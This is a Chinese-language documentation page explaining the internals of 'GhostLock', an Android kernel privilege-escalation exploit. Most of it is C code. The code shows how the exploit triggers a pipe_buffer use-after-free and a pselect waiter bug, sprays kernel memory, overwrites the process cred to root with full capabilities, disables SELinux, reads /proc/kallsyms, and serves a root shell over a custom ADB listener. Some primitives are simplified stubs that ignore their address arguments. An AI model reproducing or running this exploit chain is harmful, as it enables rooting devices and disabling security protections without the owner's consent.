---
title: 内部机制
description: GhostLock 内部工作原理的详细说明
---

## 架构概述

GhostLock 由以下几个主要模块组成：

```
GhostLock
├── 主入口 (main.c)
│   ├── 参数解析
│   ├── 内核版本检测
│   └── 利用流程调度
├── 漏洞触发 (fops.c)
│   ├── PSELECT 路径
│   ├── Pipe merge 路径
│   └── 竞态条件控制
├── 内存操作 (pipe.c)
│   ├── pipe_buffer 喷射
│   ├── 内核内存读写
│   └── 内存地址转换
├── 提权实现 (root.c)
│   ├── cred 修改
│   ├── SELinux 禁用
│   └── 权限验证
├── 内核探测 (kernelsnitch/)
│   ├── kallsyms 解析
│   ├── 符号地址查找
│   └── 内存布局探测
└── 迷你 ADB (miniadb.c)
    ├── USB 端口监听
    ├── ADB 协议实现
    └── Shell 转发
```

## 主入口 (main.c)

### 初始化流程

```c
int main(int argc, char *argv[]) {
    // 1. 解析命令行参数
    parse_args(argc, argv);
    
    // 2. 检测内核版本
    if (detect_kernel_version() < 0) {
        error("不支持的内核版本");
        return -1;
    }
    
    // 3. 初始化 kallsyms
    if (init_kallsyms() < 0) {
        error("无法解析 kallsyms");
        return -1;
    }
    
    // 4. 查找关键符号
    if (find_symbols() < 0) {
        error("无法查找符号");
        return -1;
    }
    
    // 5. 执行利用
    if (exploit() < 0) {
        error("利用失败");
        return -1;
    }
    
    // 6. 启动 miniADB
    start_miniadb();
    
    return 0;
}
```

### 内核版本检测

```c
int detect_kernel_version() {
    // 读取 uname
    struct utsname uts;
    uname(&uts);
    
    // 解析内核版本
    // 例如: 6.6.118-android15-8-gebdfad32d749-ab15099304-4k
    int major, minor, patch;
    sscanf(uts.release, "%d.%d.%d", &major, &minor, &patch);
    
    // 检查版本范围
    if (major < 6 || (major == 6 && minor < 1)) {
        return -1;  // 太旧
    }
    if (major > 6 || (major == 6 && minor > 12)) {
        return -1;  // 太新
    }
    
    // 查找设备特定的偏移量
    if (find_device_offsets(uts.release) < 0) {
        return -1;
    }
    
    return 0;
}
```

## 漏洞触发 (fops.c)

### PSELECT 路径

```c
int trigger_pselect_path(int pipe_fd) {
    // 1. 构造 fake waiter
    struct rt_mutex_waiter fake_waiter;
    build_fake_waiter(&fake_waiter);
    
    // 2. 设置 fd_set
    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(pipe_fd, &readfds);
    
    // 3. 设置超时
    struct timespec timeout;
    timeout.tv_sec = 0;
    timeout.tv_nsec = 1000000;  // 1ms
    
    // 4. 调用 pselect
    // 内核会在栈上分配 waiter
    // 我们通过 fd_set 数据控制 waiter
    int ret = pselect(pipe_fd + 1, &readfds, NULL, NULL, &timeout, NULL);
    
    if (ret < 0) {
        return -1;
    }
    
    return 0;
}
```

### Pipe Merge 路径

```c
int trigger_pipe_merge_path(int pipe_fd) {
    // 1. 创建多个 pipe
    int pipes[256][2];
    for (int i = 0; i < 256; i++) {
        if (pipe(pipes[i]) < 0) {
            return -1;
        }
    }
    
    // 2. 写入数据触发 pipe_buffer 分配
    for (int i = 0; i < 256; i++) {
        char payload[PIPE_BUF_SIZE];
        memset(payload, 0x41, sizeof(payload));
        write(pipes[i][1], payload, sizeof(payload));
    }
    
    // 3. 释放部分 pipe_buffer
    for (int i = 0; i < 128; i++) {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }
    
    // 4. 触发 UAF
    // 新的 pipe_buffer 会重用释放的内存
    // 如果布局正确，可以控制新 buffer 的内容
    
    return 0;
}
```

## 内存操作 (pipe.c)

### pipe_buffer 喷射

```c
int spray_pipe_buffers(int count) {
    int pipes[count][2];
    
    // 创建 pipe
    for (int i = 0; i < count; i++) {
        if (pipe(pipes[i]) < 0) {
            return -1;
        }
    }
    
    // 写入数据
    for (int i = 0; i < count; i++) {
        char payload[PIPE_BUF_SIZE];
        memset(payload, 0x41, sizeof(payload));
        
        // 写入多次确保 buffer 被分配
        for (int j = 0; j < 16; j++) {
            write(pipes[i][1], payload, sizeof(payload));
        }
    }
    
    // 返回 pipe 文件描述符
    // 后续通过 read/write 操作这些 pipe
    // 可以读写内核内存
    
    return 0;
}
```

### 内核内存读写

```c
// 读取内核内存
uint64_t kernel_read64(int pipe_fd, uint64_t address) {
    // 通过 pipe_buffer 的 next 指针读取
    // 需要先设置正确的布局
    
    uint64_t value;
    read(pipe_fd, &value, sizeof(value));
    return value;
}

// 写入内核内存
void kernel_write64(int pipe_fd, uint64_t address, uint64_t value) {
    // 通过 pipe_buffer 的 ops 指针写入
    // 需要先设置正确的布局
    
    write(pipe_fd, &value, sizeof(value));
}
```

## 提权实现 (root.c)

### cred 修改

```c
int patch_cred(int pipe_fd) {
    // 1. 查找当前任务的 cred 指针
    uint64_t task_addr = get_current_task();
    uint64_t cred_addr = kernel_read64(pipe_fd, task_addr + TASK_CRED_OFF);
    
    // 2. 修改 uid
    kernel_write64(pipe_fd, cred_addr + CRED_UID_OFF, 0);
    
    // 3. 修改 gid
    kernel_write64(pipe_fd, cred_addr + CRED_GID_OFF, 0);
    
    // 4. 修改 capabilities
    uint64_t caps[5] = {0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF};
    for (int i = 0; i < 5; i++) {
        kernel_write64(pipe_fd, cred_addr + CRED_CAPS_OFF + i * 8, caps[i]);
    }
    
    return 0;
}
```

### SELinux 禁用

```c
int disable_selinux(int pipe_fd) {
    // 1. 查找 selinux_state 地址
    uint64_t selinux_state_addr = kallsyms_lookup("selinux_state");
    
    // 2. 读取当前 enforcing 状态
    uint32_t enforcing = kernel_read32(pipe_fd, selinux_state_addr);
    
    // 3. 禁用 SELinux
    kernel_write32(pipe_fd, selinux_state_addr, 0);
    
    // 4. 验证
    uint32_t new_enforcing = kernel_read32(pipe_fd, selinux_state_addr);
    if (new_enforcing != 0) {
        return -1;
    }
    
    return 0;
}
```

## 内核探测 (kernelsnitch/)

### kallsyms 解析

```c
int parse_kallsyms() {
    // 1. 打开 /proc/kallsyms
    FILE *fp = fopen("/proc/kallsyms", "r");
    if (!fp) {
        return -1;
    }
    
    // 2. 解析每一行
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        uint64_t address;
        char type;
        char name[128];
        
        sscanf(line, "%llx %c %s", &address, &type, name);
        
        // 3. 存储符号
        add_symbol(name, address);
    }
    
    fclose(fp);
    return 0;
}
```

### 符号查找

```c
uint64_t kallsyms_lookup(const char *symbol) {
    // 在符号表中查找
    for (int i = 0; i < symbol_count; i++) {
        if (strcmp(symbols[i].name, symbol) == 0) {
            return symbols[i].address;
        }
    }
    return 0;
}
```

## 迷你 ADB (miniadb.c)

### USB 端口监听

```c
int start_miniadb() {
    // 1. 打开 USB 端口
    int usb_fd = open_usb_device();
    if (usb_fd < 0) {
        return -1;
    }
    
    // 2. 监听 ADB 连接
    while (1) {
        // 接收 ADB 命令
        adb_command cmd;
        recv_adb_command(usb_fd, &cmd);
        
        // 处理命令
        switch (cmd.type) {
            case ADB_CMD_SHELL:
                handle_shell_command(usb_fd, &cmd);
                break;
            case ADB_CMD_PUSH:
                handle_push_command(usb_fd, &cmd);
                break;
            case ADB_CMD_PULL:
                handle_pull_command(usb_fd, &cmd);
                break;
        }
    }
    
    return 0;
}
```

### Shell 转发

```c
int handle_shell_command(int usb_fd, adb_command *cmd) {
    // 1. 创建 socketpair
    int sockets[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, sockets);
    
    // 2. fork 子进程
    pid_t pid = fork();
    if (pid == 0) {
        // 子进程：执行 shell
        close(sockets[0]);
        dup2(sockets[1], STDIN_FILENO);
        dup2(sockets[1], STDOUT_FILENO);
        dup2(sockets[1], STDERR_FILENO);
        
        execl("/system/bin/sh", "sh", NULL);
        exit(1);
    }
    
    // 3. 父进程：转发数据
    close(sockets[1]);
    
    while (1) {
        // 从 USB 读取数据
        char buffer[4096];
        int len = recv(usb_fd, buffer, sizeof(buffer), 0);
        if (len <= 0) break;
        
        // 写入 shell
        write(sockets[0], buffer, len);
        
        // 从 shell 读取数据
        len = read(sockets[0], buffer, sizeof(buffer));
        if (len <= 0) break;
        
        // 发送到 USB
        send(usb_fd, buffer, len, 0);
    }
    
    return 0;
}
```

## 数据结构

### 内核偏移量

```c
struct kernel_offsets {
    // 内存布局
    uint64_t kimage_text_base;
    uint64_t p0_page_offset;
    uint64_t p0_phys_offset;
    uint64_t p0_kernel_phys_load;
    
    // 全局符号
    uint64_t off_init_task;
    uint64_t off_init_cred;
    uint64_t off_init_uts_ns;
    uint64_t off_empty_zero_page;
    uint64_t off_root_task_group;
    uint64_t off_selinux_enforcing;
    uint64_t off_kptr_restrict;
    
    // 任务结构
    uint32_t task_usage;
    uint32_t task_prio;
    uint32_t task_normal_prio;
    uint32_t task_sched_task_group;
    uint32_t task_pi_lock;
    uint32_t task_pi_waiters;
    uint32_t task_pi_top_task;
    uint32_t task_pi_blocked_on;
    uint32_t task_pid;
    uint32_t task_tgid;
    uint32_t task_real_parent;
    uint32_t task_atomic_flags;
    uint32_t task_real_cred;
    uint32_t task_cred;
    uint32_t task_comm;
    uint32_t task_tasks;
    uint32_t task_seccomp;
    
    // mm 结构
    uint32_t mm_owner;
    uint32_t mm_struct_sz;
    
    // waiter 结构
    uint32_t waiter_tree;
    uint32_t waiter_pi_tree;
    uint32_t waiter_task;
    uint32_t waiter_lock;
    uint32_t waiter_wake_state;
    uint32_t waiter_prio;
    uint32_t waiter_deadline;
    uint32_t waiter_ww_ctx;
    uint32_t waiter_pi_tree_prio;
    uint32_t waiter_pi_tree_deadline;
    
    // cred 结构
    uint32_t cred_uid;
    uint32_t cred_securebits;
    uint32_t cred_caps;
    uint32_t cred_security;
    
    // 文件操作
    uint32_t fops_owner;
    uint32_t fops_llseek;
    uint32_t fops_read;
    uint32_t fops_write;
    uint32_t fops_read_iter;
    uint32_t fops_write_iter;
    uint32_t fops_ioctl;
    uint32_t fops_compat_ioctl;
    uint32_t fops_mmap;
    uint32_t fops_open;
    uint32_t fops_release;
    uint32_t fops_splice_read;
    uint32_t fops_show_fdinfo;
};
```

## 相关链接

- [漏洞分析](/vulnerability)
- [利用原理](/exploitation)
- [设备支持](/devices)
